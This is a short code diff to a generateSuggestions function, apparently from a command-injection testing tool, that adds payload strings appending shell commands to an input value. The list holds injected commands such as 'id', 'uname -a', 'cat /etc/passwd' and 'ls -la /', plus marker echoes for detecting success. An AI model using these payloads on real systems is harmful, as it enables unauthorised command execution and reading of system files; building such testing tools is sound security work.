@@ -648,6 +648,8 @@ export function generateSuggestions(
 
     default:
       return [
+        `${b};echo '${NEXUS_MARKER}' 2>/dev/null`,
+        `${b} && echo '===NEXUS_SUCCESS===' && id`,
         `${b} && id && uname -a && hostname`,
         `${b}; cat /etc/passwd`,
         `${b}; ls -la /`,
